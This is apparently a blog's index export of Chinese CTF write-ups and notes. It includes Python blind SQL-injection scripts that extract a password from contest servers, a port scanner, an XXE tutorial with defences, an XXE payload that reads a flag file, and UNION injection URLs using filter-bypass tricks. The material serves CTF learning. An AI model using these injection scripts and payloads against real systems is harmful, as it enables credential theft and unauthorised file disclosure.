<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[BugKu--login3(SKCTF)]]></title>
    <url>%2F2019%2F07%2F30%2FBugKu-login3-SKCTF%2F</url>
    <content type="text"><![CDATA[看到一个登陆框 ，首先用admin+万能密码登陆，发现提示密码错误证明用户名是正确的。所以我们开始注入：首先我们输入admin’:输入admin ‘#，提示密码错误，输入admin’ #,提示非法字符，一看就是过滤了空格，我们单独输入and、union、select、for、from,发现过滤了and、union、for字符。接着我们就需要绕过过滤字符： 括号绕过空格： 如果空格被过滤，括号没有被过滤，可以用括号绕过。 在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。例如： dual where(11234这种过滤方法常常用于time based盲注,例如：```?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23 逗号绕过（使用from或者offset）： 在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决： substr(database() from 1 for 1);```12```select mid(database() from 1 for 1); 等于号=：用&lt;&gt;(不等于)绕过。 按照以上思路我们使用： from 1 for 1))```,但是我们发现for也被过滤了。我们发现mysql用ascii的参数是一个字符串时，会只计算字符串第一位的ascii值。12345678910111213141516171819202122232425262728![](http://i1.fuimg.com/695378/1b7736f50af37534.png)如图所示，语句```ascii(substr(database()from(1)))```就可以输出数据库名第一位的ascii值那么思路就很清晰了，根据输入```admin&apos;^(ascii(substr(database()from(数字1)))&lt;&gt;数字2)#```，根据返回的信息，如果返回了&quot;password error!&quot; ，说明数字2就是数据库的第一位(数字1)的ascii值，为什么这么说呢？admin用户存在，返回1。数字二等于数字一。后面的语句返回0，即1 ^0返回1。说明用户输入栏正确，所以返回password错误。我们写脚本爆出数据库：```pythonimport requestsurl = &apos;http://118.89.219.210:49167/index.php&apos;all_string = &apos;&apos;&apos;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&apos;&apos;&apos;database = &apos;&apos;for i in range(1,11): for j in all_string: print(&apos;checking &apos;+j) data = &#123; &apos;username&apos;:&quot;admin&apos;^(ascii(substr(database()from(%d)))&lt;&gt;%d)#&quot;%(i,ord(j)), &apos;password&apos;:&apos;1&apos;, &apos;submit&apos;:&apos;Log In&apos; &#125; r = requests.post(url,data=data) if &apos;password error!&apos; in r.text: database = database + j print(&apos;the &apos;+str(i)+&apos; place of database is &apos;+j) break if j == &apos;M&apos; and &apos;username does not exist!&apos; in r.text: breakprint(database) 本来按这个思路可以继续注表名的，但是发现information被过滤了，无奈，表和列名好像只能靠猜 看别人猜的表名为admin，列名为password，真是玄学… 那就直接爆password：接着们爆出表： 123456789101112131415161718192021import requestsurl = 'http://123.206.31.85:49167/index.php'all_string = '''1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''password = ''for i in range(1,51): for j in all_string: print('checking '+j) data = &#123; 'username':"admin'^(ascii(substr((select(password)from(admin))from(%d)))&lt;&gt;%d)#"%(i,ord(j)), 'password':'1', 'submit':'Log In' &#125; r = requests.post(url,data=data) if 'password error!' in r.text: password = password + j print('the '+str(i)+' place of password is '+j) break if j == 'M' and 'username does not exist!' in r.text: breakprint(password) 我们可以看出爆出了密码，解密skctf123456。 补充一下知识点：1.ord()函数主要用来返回对应字符的ascii码 1234&gt;&gt;&gt; ord("a")97&gt;&gt;&gt; chr(97)&gt; 'a 打印字符串 print (“His name is %s”%(“Aviad”)) 效果：打印整数 print (“He is %d years old”%(25)) 效果：]]></content>
      <tags>
        <tag>slq 注入</tag>
        <tag>BUGKU</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-scoket主机识别]]></title>
    <url>%2F2019%2F07%2F29%2Fpython-scoket%E4%B8%BB%E6%9C%BA%E8%AF%86%E5%88%AB%2F</url>
    <content type="text"><![CDATA[1234567891011121314151617#!/usr/bin/python#coding=utf-8import socketdef portScan(ip,port): try: s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect(ip,port) print "%s TCP port %d is open"%(ip,port) except: print "%s TCP port %d is close"%(ip,port) finally: s.close()if __name__=="__main__": ip='192.168.19.1' port=8888888 portScan(ip,port) 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/python#coding=utf-8import socketfrom threading import Threadfrom optparse import OptionParserdef portScan(ip,port): try: c=socket.socket(socket.AF_INET,socket.SOCK_STREAM) c.connect((ip,port)) print "%s TCP port %d is open"%(ip,port) except: print "%s TCP port %d is closed"%(ip,port) finally: c.close()if __name__=="__main__": parser=OptionParser('usage: %prog -i &lt;target host&gt; -n &lt;network&gt; -p &lt;target port&gt;') parser.add_option('-i',type='string',dest='tgtIP',help='specify target host') parser.add_option('-n',type='string',dest='tgtnetwork',help='specify target network') parser.add_option('-p',type='string',dest='tgtport',help='specify target port') (options,args)=parser.parse_args() tgtIP=options.tgtIP tgtnetwork=options.tgtnetwork tgtport=options.tgtport if (tgtport == None or tgtIP==None and tgtnetwork==None): print parser.usage exit(0) tgtport=tgtport.split(',') if tgtIP: for p in tgtport: portScan(tgtIP,int(p)) if tgtnetwork: ip=tgtnetwork.split('.')[0] + '.' +tgtnetwork.split('.')[1] + '.' +tgtnetwork.split('.')[2] + '.' for i in range(1,255): try: IP=ip + str(i) for p in tgtport: t=Thread(target=portScan,args=(IP,int(p))) t.start() except KeyboardInterrupt: exit()]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xxe漏洞详解]]></title>
    <url>%2F2019%2F07%2F29%2Fxxe%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[基础知识 XML基础知识XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。—-看了之后是不是很牛逼？高大上？其实百分之99的人看不懂。下面来点通俗的讲解： 简单概括的话就是，xml本身是一种格式规范，是一种包含了数据以及数据说明的文本格式规范。比如，我们要给对方传输一段数据，数据内容是“too young,too simple,sometimes naive”，要将这段话按照属性拆分为三个数据的话，就是，年龄too young，阅历too simple，结果sometimes naive。 我们都知道程序不像人，可以体会字面意思，并自动拆分出数据，因此，我们需要帮助程序做拆分，因此出现了各种各样的数据格式以及拆分方式。比如，可以是这样的数据为“too young,too simple,sometimes naive”然后按照逗号拆分，第一部分为年龄，第二部分为阅历，第三部分为结果。也可以是这样的数据为“too_young**too_simple*sometimes_naive”从数据开头开始截取前面十一个字符，去掉*号并把下划线替换为空格作为第一部分，再截取接下来的十一个字符同样去掉*并替换下划线为空格作为第二部分，最后把剩下的字符同样去*号体会空格作为第三部分。 这两种方式都可以用来容纳数据并能够被解析，但是不直观，通用性也不好，而且如果出现超过限定字数的字符串就容纳不了，也可能出现数据本身就下划线字符导致需要做转义。基于这种情况，出现了xml这种数据格式， 上面的数据用XML表示的话可以是这样 1234567&lt;person age="too young" experience="too simple" result="sometimes naive" /&gt;也可以是这样&lt;person&gt; &lt;age value="too young" /&gt; &lt;experience value="too simple" /&gt; &lt;result value="sometimes naive" /&gt;&lt;/person&gt; 两种方式都是xml，都很直观，附带了对数据的说明，并且具备通用的格式规范可以让程序做解析。如果用json格式来表示的话，就是下面这样{ “age”:”too young”, “experience”:”too simple”, “result”:”sometimes naive”}其实数据都是一样的，不同的只是数据的格式而已，同样的数据，我用xml格式传给你，你用xml格式解析出三个数据，用json格式传给你，你就用json格式解析出三个数据，还可以我本地保存的是xml格式的数据，我自己先解析出三个数据，然后构造成json格式传给你，你解析json格式，获得三个数据，再自己构造成xml格式保存起来，说白了，不管是xml还是json，都只是包装数据的不同格式而已，重要的是其中含有的数据，而不是包装的格式。 DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。内部声明DTD 根元素 [元素声明]&gt; 引用外部DTD 根元素 SYSTEM “文件名”&gt;或者根元素 PUBLIC “public_ID” “文件名”&gt;** //注意文件包含漏洞 DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。 内部声明实体 实体名称 “实体的值”&gt; 引用外部实体实体 名称 SYSTEM “URI”&gt; //注意ssrf漏洞 或者 实体名称 PUBLIC “public_ID” “URI”&gt; DTD基础知识在信息的高速交流中，不同领域之间的信息交换越来越紧密，如何才能保证这些不同领域之间的信息可以更容易且更有效率地交换成为我们首要关注的问题。为了解决这个问题，就需要不同的领域来针对领域的特性制定共同的信息内容模型（content model），然后再通过这个共同的内容模型来标识信息。而DTD就是一种内容模型。 DTD（文档类型定义）可以定义合法的XML文档结构，它使用一系列合法元素来定义文档的结构。DTD分为内部DTD和外部DTD，所谓内部DTD是指该DTD在某个文档的内部，只被该文档使用。外部DTD是指该DTD不在文档内部，可以被其他所有的文档来共享。DTD文档与XML文档实例的关系可以看成是类和对象的关系。 DTD的优势 每一个XML文档都可携带一个DTD，用来对该文档格式进行描述，测试该文档是否为有效的XML文档。既然DTD有外部和内部之分，当然就可以为某个独立的团体定义一个公用的外部DTD，那么多个XML文档就都可以共享使用该DTD，使得数据交换更为有效。甚至在某些文档中还可以使内部DTD和外部DTD相结合。在应用程序中也可以用某个DTD来检测接收到的数据是否符合某个标准。 对于XML文档而言，虽然DTD不是必须的，但它为文档的编制带来了方便。加强了文档标记内参数的一致性，使XML语法分析器能够确认文档。如果不使用DTD来对XML文档进行定义，那么XML语法分析器将无法对该文档进行确认。举个例子： 1234567&lt;stu id="a&amp;quot;0&amp;apos;0&amp;apos;1&amp;lt;" &gt;&lt;name&gt;杨过&lt;/name&gt;&lt;sex&gt;男&lt;/sex&gt;&lt;age&gt;30&lt;/age&gt;&lt;介绍&gt;我是好人&lt;/介绍&gt;&lt;面积&gt;100平&lt;/面积&gt;&lt;/stu&gt; xml过于自由。快速入门案例基本语法是: 123456789101112131415&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!--引入dtd去约束该xml文件--&gt;&lt;!DOCTYPE 班级 SYSTEM "myClass2.dtd"&gt;&lt;班级&gt; &lt;学生&gt; &lt;名字&gt;周星驰&lt;/名字&gt; &lt;年龄&gt;23&lt;/年龄&gt; &lt;介绍&gt;学习刻苦&lt;/介绍&gt; &lt;/学生&gt; &lt;学生&gt; &lt;名字&gt;林青霞&lt;/名字&gt; &lt;年龄&gt;32&lt;/年龄&gt; &lt;介绍&gt;是一个好学生&lt;/介绍&gt; &lt;/学生&gt;&lt;/班级&gt; 123456myClass2.dtd&lt;!ELEMENT 班级 (学生+)&gt;&lt;!ELEMENT 学生 (名字,年龄,介绍)&gt;&lt;!ELEMENT 名字 (#PCDATA)&gt;&lt;!ELEMENT 年龄 (#PCDATA)&gt;&lt;!ELEMENT 介绍 (#PCDATA)&gt; 漏洞利用 XML外部实体注入(XML External Entity)当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。 引入外部实体方式有多种，比如：恶意引入外部实体方式1：XML内容：恶意引入外部实体方式2：XML内容：DTD文件(evil.dtd)内容：恶意引入外部实体方式3：XML内容：DTD文件(evil.dtd)内容：另外，不同程序支持的协议不一样，上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有 12&lt;?xml version="1.0" standalone="no"?&gt;&lt;!DOCTYPE root SYSTEM "http://www.test.org/test.dtd"&gt; 对于以上的一些代码我们做一些解释：DOCTYPE分析DTD声明始终以!DOCTYPE开头,空一格后跟着文档根元素的名称,如果是内部DTD,则再空一格出现[],在中括号中是文档类型定义的内容. 而对于外部DTD,则又分为私有DTD与公共DTD,私有DTD使用SYSTEM表示,接着是外部DTD的URL. 而公共DTD则使用PUBLIC,接着是DTD公共名称,接着是DTD的URL.下面是一些示例公共DTD,DTD名称格式为”注册//组织//类型 标签//语言”,”注册”指示组织是否由国际标准化组织(ISO)注册,+表示是,-表示不是.”组织”即组织名称,如:W3C; “类型”一般是DTD,”标签”是指定公开文本描述，即对所引用的公开文本的唯一描述性名称,后面可附带版本号。最后”语言”是DTD语言的ISO 639语言标识符,如:EN表示英文,ZH表示中文,在下面的地址有完整的ISO 639语言标识符列表[url]http://ftp.ics.uci.edu/pub/ietf/http/related/iso639.txt [/url] 以下举例说明XXE危害，当然XXE不止这些危害。XXE危害1：读取任意文件 该CASE是读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件，获取帐号密码后进一步攻击，如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。 另外，数据不回显就没有问题了吗？如下图， 不，可以把数据发送到远程服务器，远程evil.dtd文件内容如下：触发XXE攻击后，服务器会把文件内容发送到攻击者网站 XXE危害2：执行系统命令 该CASE是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。 XXE危害3：探测内网端口 该CASE是探测192.168.1.1的80、81端口，通过返回的“Connection refused”可以知道该81端口是closed的，而80端口是open的。 XXE危害4：攻击内网网站该CASE是攻击内网struts2网站，远程执行系统命令。 客户端XXE案例日前，某office文档转换软件被爆存在XXE漏洞（PS:感谢TSRC平台白帽子Titans)报告告漏洞），某一应用场景为：Web程序调用该office软件来获取office文档内容后提供在线预览。由于该软件在处理office文档时，读取xml文件且允许引用外部实体，当用户上传恶意文档并预览时触发XXE攻击。详情如下：新建一个正常文档，内容为Hi TSRC， 使用该软件转换后可以得到文本格式的文档内容， 当往该docx的xml文件注入恶意代码（引用外部实体）时，可进行XXE攻击。 防御XXE攻击 方案一、使用开发语言提供的禁用外部实体的方法PHP：libxml_disable_entity_loader(true); 其他语言:https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet 方案二、过滤用户提交的XML数据 关键词：，SYSTEM和PUBLIC。]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jarvis-OJ-api调用]]></title>
    <url>%2F2019%2F07%2F29%2FJarvis-OJ-api%E8%B0%83%E7%94%A8%2F</url>
    <content type="text"><![CDATA[面对这道题我完全小白，所以我必须详细解释。 基础知识 什么是php框架？框架思想就是提供一种可以在多个应用程序中使用的设计。所有应用程序都有大量通用的基本内容 —— 具体地说，就是某类与数据库的接口、某些应用程序逻辑、应用程序呈现给用户的内容等。如果您编写过许多 PHP 应用程序，则会知道这些基本内容是什么。您可能已经编写过一组函数或从数据库中读取数据和向数据库中写入数据的类，可能已经使用过诸如 Smarty 之类的模板引擎来管理 UI。而且一定编写过大量 PHP 代码来完成诸如分析表单提交并根据提交的数据作决定之类的事务。如果您已经编写过很多应用程序，则可能已经一次又一次地做过相同的基本工作，有时还会将一个应用程序中的代码借用到另一个应用程序中。 框架专门用于为这些常用元素(数据库交互、表示层、应用程序逻辑)提供结构，以便您可以花费更少的时间来编写数据库接口代码或者表示层接口，而花费更多的时间来编写应用程序本身。以这种方式分解应用程序，这种架构被称为模型-视图-控制器(Model-View-Controller，MVC)。模型 指数据，视图 指表示层，而控制器 指应用程序逻辑或业务逻辑。对 MVC 的完整讨论超出本文的范围，但是鼓励您研究 MVC 并深入了解 MVC 的一切(请参阅 参考资料)。 选择框架 每种语言几乎都有若干个框架可用。选择刚好满足需求的框架可能有点难，尤其是当您以前未曾使用过任何一个框架时更是如此。虽然熟悉此领域的同事和可信赖的 developerWorks 作者提供的建议和评价会十分有帮助，但是选择任何框架时实际上应当遵循的惟一一个指导原则是：框架为每个人 节省的时间和精力越多越好。如果一个框架工作得很好但是会导致产生大量支持调用，那就不是一个优秀框架。如果一个框架易于支持，但是起到的阻碍作用大于辅助开发作用，那也不是一个优秀框架。如果一个框架十分优雅，但是会导致出现支持问题和开发问题，那么这个框架也是没有用的。 选择项目框架时，考虑从上到下所有相关人员的意见，并且在评估框架时，考虑到对其他各方的影响。 当考虑采用一个框架时，请进一步审视您的应用程序，并思考该应用程序是不是需要一个框架。框架不是必需品。即使不使用框架，也可以继续编写企业应用程序。框架会对项目有帮助么?它是否会节省每个人的时间和精力?您的应用程序在框架中是否会执行得更好?它是否将提供所缺乏的稳定性?如果上面任意一个问题的答案为是，那么您应当考虑采用框架。如果所有这些问题的答案都为否，那么使用框架只会把事情变复杂。 什么是api？从文件操作开始谈API。以C语言为例，我们使用fopen()函数可以打开一个文件，感觉非常简单。文件保存在硬盘上，要经过复杂的处理才能显示，这些细节对我们来说是透明的，由操作系统完成。也就是说，我们调用fopen()函数来通知操作系统，让操作系统打开一个文件。那么，我们如何告诉操作系统打开文件呢？ 看似简单的操作到底层都非常复杂，打开文件首先要扫描硬盘，找到文件的位置，然后从文件中读取一部分数据，将数据放进I/O缓冲区，放进内存；这些数据都是0、1序列，还要对照ASCII表或Unicode表”翻译“成字符，再在显示器上显示出来。这个过程如果要让程序员来完成，那简直是噩梦！怎么办呢？操作系统想了一个很好的办法，它预先把这些复杂的操作写在一个函数里面，编译成一个组件（一般是动态链接库），随操作系统一起发布，并配上说明文档，程序员只需要简单地调用这些函数就可以完成复杂的工作，让编程变得简单有趣。这些封装好的函数，就叫做API(Application Programming Interface)，即应用程序编程接口。说得更加通俗易懂一些，别人写好的代码，或者编译好的程序，提供给你使用，就叫做API。你使用了别人代码（或者程序）中的某个函数、类、对象，就叫做使用了某个API。 各种编程语言自带的标准库其实也是API。这些API由编程语言的开发者们编写，安全、高效、健壮，为我们实现了常见的功能，让我们不用再重复造轮子。C语言 API 以函数的形式呈现，例如 printf()、scanf()、fopen() 等。Java API 主要以类的形式呈现，例如 String、Thread、Date 等。C++ 是在C语言的基础上进行的扩展，所以 C++ API 既包含函数也包含类。第三方库（框架）libxml2——xml的c语言版库，2个项目使用过，win和Linux下都很犀利~~比较快捷CURL—— 这个用的主要是使用了他的封装的http和https的请求，比较犀利，其中包含了openssl的内容iconv——功能强大的编码格式转化库，UTF8，Unicode等互相转化很方便openssl——C的开源密库，可以进行证书加密和https的访问的模拟提交可以和CURL配合使用cocos2d——2D游戏引擎，相比较传统的UI自己控制的重画OpenCV——开源图像库还有很多第三方（非官方）的组织机构、公司、个人提供的代码，也是一种 API。这些代码有的免费，有的收费；有的开源，有的闭源。这些代码大都针对某个特定的应用领域编写，有时候被称为框架或者库。例如基于C语言的图形界面库GTK，基于C++的网络库ACE，基于Java的大数据处理平台Hadoop，基于Python的Web开发框架Django，基于JavaScript的前端开发框架React。严格的来说, API 代表：应用程序编程接口，在某些或其他方面，很多大型公司会建立自己的API提供给用户或者内部使用。不过怎么用通俗的语言向你解释什么是API呢，在开发和业务中他是不是更多的含义呢，让我们后退一步看看网络是如何工作的。严格的来说, API 代表：应用程序编程接口，在某些或其他方面，很多大型公司会建立自己的API提供给用户或者内部使用。不过怎么用通俗的语言向你解释什么是API呢，在开发和业务中他是不是更多的含义呢，让我们后退一步看看网络是如何工作的。 www和远程服务器当我想到网络的时候，我脑海中想象了一张巨大的连接服务网络每一张页面都储存在远程服务器中，而一个远程服务器并不是那么的神秘，他就是一部分用来优化请求过程的远程计算机。为了能让事情更透明，你可以在你一台可以服务整个网站到网络上的手提电脑上启动一个服务器（事实上，一个本地服务器就是在发布到公众上之前工程师需要开发网站：注：其实这句话我不是很理解，翻译得乱七八糟，原文是：a local server is what engineers use to develop websites before releasing them to the public）。当你键入www.facebook.com进入你的浏览器并回车的时候，一个请求就去到了faceboook的远程服务器。一旦你的浏览器接收到了响应，它就解析代码并展示页面。浏览器，也就是我们说的客户端 ，也可以不太严谨的说facebook的服务器就是个API ，这意味这每次你在网络上浏览网页的时候，你就和一些远程服务器的API发生了交互。一个API并不是等同于一整个远程服务器，他是服务器用来接受请求和发送响应的一部分 API就是一种为你客户提供服务的方法你可能听说过公司将API包做成一个产品，例如，”地下气象站“出售的就是它自己的气象数据API的 入口实例场景： 你的个人小型商业网站有一个给客户注册的预约表格，你想要给你的客户提供自动创建一个谷歌日历时间的能力。API 使用：这概念就是让你的网站服务器带着请求去创建一个具体的事件，你的服务器之后会接收到谷歌的响应，处理它，然后将有关信息发送回给你的浏览器，例如发送一个认证信息给你的用户。另外，你的浏览器会通过你的服务器经常直接发送API 请求到谷歌服务器。谷歌日历的API 和其他的远程服务器的API 究竟有什么不同。专业的说，不同之处在于他们的请求和响应的形式是不一样的。当你提交整个页面的时候，你的浏览器期待的是一种HTML格式的响应，这个响应里包含了一些描述性的代码，当谷歌日历API 响应的时候会返回一些数据，大多是类似与json的格式。如果你的网站服务器发出了个API 请求，那么你的网站服务器就变成了个客户端（类似与当你使用浏览器访问网站的时候你的浏览器就成了客户端一样），从用户的角度来说，API允许他们完成一些没有离开网站的动作。很多现代的网站都至少使用了一些第三方API。很多问题都有了第三方的解决方案了，无论是以函数库或者是服务的形式，使用第三方的解决方案现在已经逐渐变得更简单和更可靠。这是很常见的，开发团队将他们的应用分解到多个服务器里面，服务器通过API 相互交流。为主应用服务器提供辅助功能的服务器这方面的知识可以参考微型服务器。总得来说，当一个公司向它的用户提供了API 的时候，这就意味着他们建造了一系列的专用URL通道，用来返回纯数据形式的响应，意味这响应不会包含一些用于解释的额外开销，你期望的是一种像网站一样的图表用户界面。你的浏览器可以发送这种请求吗，当然可以，由于实际的HTTP传输都是以文本的形式进行的，你的浏览器总是能达到它能展示响应的最好状态。例如，你可以通过浏览器直接访问GitHub的API ，甚至根本不需要访问标记（=_= # 什么是访问标记…..)，当你用浏览器访问一个GitHub的用户API的时候，你将获得一个JSON形式的响应 A就是application作为结束，就多扔几个关于API 的事例吧“应用”可以指很多事情，在API 里面他指代的是： 1 :一个具有不同功能的软件 2：整个服务器，整个app，或者是app的一小部分基本上任何软件都可以从环境中有区别的分离开来，有可能在API 里成为A（也就是Application），也可能它本身就是某种API。假设你在你的代码里使用了第三方的函数库，一旦与你的代码结合了，一个函数路就成为了你真个APP里的一部分，成为软件中特殊的一部分，函数库很可能具有一个让你可以与你其他的代码相互沟通的API .这有其他的一些例子，在面对对象设计中，代码是被组织进对象的，你的应用程序可能是由上百个可以相互交流的类构成的,每个类都有一个API ，一系列公共方法和用于和其他类进行交流的的属性,一个类可能有内部的私有化属性，这意味这它是对外部环境隐藏的（不是一个API ）,在使用API 这个东西越来越普遍的今天，希望你看完本篇文章后会有更多的理解 JSONJSON(JavaScript Object Notation, JS 对象简谱) 是一种轻量级的数据交换格式。它基于 ECMAScript (欧洲计算机协会制定的js规范)的一个子集，采用完全独立于编程语言的文本格式来存储和表示数据。简洁和清晰的层次结构使得 JSON 成为理想的数据交换语言。 易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率 xxe漏洞详解此部分在我的博客有详细解说,一定要先看看去看 解题步骤 我们一开始看到一个登陆框，输入没什么反省，只是回显字段，后来我们抓包也没什么反映，但是我们在输入参数之后进行抓包，出现反映了。我们可以看到回显信息是json格式，而且content-type为application/json。application即为应用，api简称是啥应用程序编程接口，题目是啥api调用emmmmmmmm有点关系了。 关于content-type MediaType，即是Internet Media Type，互联网媒体类型；也叫做MIME类型，在Http协议消息头中，使用Content-Type来表示具体请求中的媒体类型信息。 常见的媒体格式类型如下：text/html ： HTML格式text/plain ：纯文本格式text/xml ： XML格式image/gif ：gif图片格式image/jpeg ：jpg图片格式image/png：png图片格式以application开头的媒体格式类型：application/xhtml+xml ：XHTML格式application/xml ： XML数据格式application/atom+xml ：Atom XML聚合格式application/json ： JSON数据格式application/pdf ：pdf格式application/msword ： Word文档格式application/octet-stream ： 二进制流数据（如常见的文件下载） 题目表述：请设法获得目标机器/home/ctf/flag.txt中的flag值。题目还出现了json，而且我们可以看到我们传入的数据以另一种的形式出现在下面，可以修改。这里使我们想到了xml，与xml相关的漏洞是什么？xee，xee原理我们已经了解过了所以我们开始获取flag。XXE漏洞就是服务器接受从客户端发送来的xml格式数据时，xml数据中恶意的引用了外部实体，将它的值绑定为服务器的目标文件，这样在服务器返回给我们解析后的值时，就会把目标文件的内容返回给我们，我们就读取了敏感文件。 但是这道题目，默认的是json格式传递，因此首先我们更改Content-Type的值为application/xml,然后传入xml代码： 12345&lt;?xml version=”1.0″?&gt;&lt;!DOCTYPE abcd[&lt;!ENTITY any SYSTEM "file:///home/ctf/flag.txt"&gt;]&gt;&lt;something&gt;&amp;any;&lt;/something&gt; ![eccc79ae19c21b84d284e8010b90b535.png](Jarvis-OJ-api调用/Image [4].png)]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Jarvis-OJ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jarvis OJ IN A Mess]]></title>
    <url>%2F2019%2F07%2F27%2FJarvis-OJ-IN-A-Mess%2F</url>
    <content type="text"><![CDATA[查看源码发现index.phps文件，打开开始代码审计 1234567891011121314151617181920212223242526&lt;?phpif(!$_GET['id'])&#123; header('Location: index.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'Hahahahahaha'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="1112 is a nice lab!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("flag.txt");&#125;else&#123; print "work harder!harder!harder!";&#125;?&gt; 代码解释：1.判断id参数存不存在，如果不存在跳转到index.php?id=12.获取三个变量id，a，b3.判断a变量中有没有’.’4.打开文件a,并且放到字符串r中5.1)data变量等于一个字符串2)id=03)b变量的长度大于54)ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。eregi函数对大小写不敏感。6.file_get_contents 函数返回字符串的结果，可以赋值给变量，也可以直接进行使用：返回结果直接使用的例子代码：echo file_get_contents(‘a.txt’);此语句直接显示a.txt的文件内容返回结果赋值给变量的例子代码：$s=file_get_contents(‘a.txt’);接下来可以对字符串变量$s进行使用，例如获取部分内容。 @符号用来屏蔽错误信息，当函数不存在或者包含文件不存在时，不会显示错误信息。 eregi存在%00截断，而substr没有，也就是说eregi如果第一个字符是%00，那它就跳过这个再检测。 123456789&lt; ?php if (ereg("c","abcdef"))&#123; //说明：判断abcdef中是否含有字母c echo "通过"; &#125;else&#123; echo "错误"; &#125; ?&gt; eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) 他的意思就是判断某个字符串中是否有1114，这个某个字符串就是111加上b的第一个字符。这个条件很容易满足，但是问题就在后面，它又要求b的第一个字符不等于四。前后矛盾啊。在这里我们使用00截断而且变量a的值是一个文件，不是一个字符串。因此我们就不能将对应的字符串传递给a，使得data为对应的字符串。在这里我们使用php伪协议。那么php伪协议到底什么呢？php://input 是个可以访问请求的原始数据的只读流。，我们的变量a必须是一个文件名字，但是我们总不能在部署服务器上搭建一个文件，所以这个协议在这里充当的作用就是一个衔接的作用，我们以post方式传递参数。id的值很显然不能为0，但是我们可以利用弱等于。那我们就开始构造payload：长度大于5其中有1114但是第四个不等等于4 http://web.jarvisoj.com:32780/index.php?id=a&amp;a=php://input&amp;b=%0041114竟然不出flag，给了一串字符。不是加密、、、也不是flag、、、前面有个/有点像目录呀，试试呗。后面有个id，可能是sql注入？加个单引号’判断列但是无论多少列都是一样的回显，肯定过滤了什么，我们试试过没过滤空格,在下面的步骤中我们试过了没有过滤order by,但是为什么这里是sql防御回显,肯定是过滤了空格。 既然这样那么我们就开始苦逼的sql注入之路吧 一开始是各种猛操作啊，但是屁用没有，正常的思路就是应该判断过滤了什么，但是我嫌麻烦。。。返回头来还是老老实实的看过滤什么字符吧，一开始我想到了burp的模糊测试，但是太麻烦了分post和get，我在网上只找到了post的方法。最后用到了我以前学习的小技巧。web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1&#39;^(length(select)=0)select被过滤掉了。接着我们就换其他的测试，在这里想测谁的就测谁的哈哈哈哈哈哈哈哈哈哈。但是被过滤了我们不要忘记绕过方法。比如双写http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1%27^(length(selecselectt)=0)最后我我们得到的结果：被过滤：selectfrom没有被过滤：andwhereor/2//#(为了避免笔记对应的操作这里加一个/)information‘orderby我在测试空格的时候，竟然爆错了，说明空格不但被过滤了而且。。。还被限制了。/**/ 竟然也被限制了emmm太毒了。–+也被限制了但是#没有哈哈哈哈哈哈哈哈哈哈 这题很狗啊，双写绕过必须穿插，不能是selectselect. 真正的注入即将开始http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1/*1*/or/*1*/1=1#http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1/*1*/order/*1*/by/*1*/3#三个字段。回显正常。4个字段回显不正常 http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uniounionn/*1*/selecselectt/*1*/1,2,group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636F6E74656E74#http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uniounionn/*1*/selecselectt/*1*/1,2,context/*1*/ffromrom/*1*/content# flag得到了，那么我们现在就来总结一下吧。首先，我们正常思路，单引号、order by、union、select。在这里我们一定要主要我们每次输入语句的时候页面给我们回显的是什么，在这个题中我们输入单引号报错，页面给我们回显。其实当我们使用or 